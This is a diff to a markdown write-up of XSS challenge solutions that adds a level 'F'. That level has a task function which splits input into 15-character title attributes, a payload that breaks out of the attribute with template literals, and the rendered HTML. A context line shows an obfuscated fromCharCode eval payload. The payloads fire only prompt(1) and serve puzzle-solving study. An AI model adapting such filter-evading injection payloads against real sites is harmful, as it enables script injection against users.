@@ -10,6 +10,7 @@
 - [A](#a)
 - [B](#b)
 - [C](#c)
+- [F](#f)
 
 ## 0
 
@@ -210,4 +211,36 @@ eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.from
 
 ```
 <script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
+```
+
+### F
+
+Task
+
+```
+function escape(input) {
+    // sort of spoiler of level 7
+    input = input.replace(/\*/g, '');
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+
+    return segments.map(function(title, index) {
+        // title can only contain 15 characters
+        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
+    }).join('\n');
+}
+```
+
+Solution
+
+```
+"><script>`#${prompt(1)}#`</script>
+```
+
+HTML source
+
+```
+<p class="comment" title=""><script>`" data-comment='{"id":0}'></p>
+<p class="comment" title="${prompt(1)}" data-comment='{"id":1}'></p>
+<p class="comment" title="`</script>" data-comment='{"id":2}'></p>
 ```
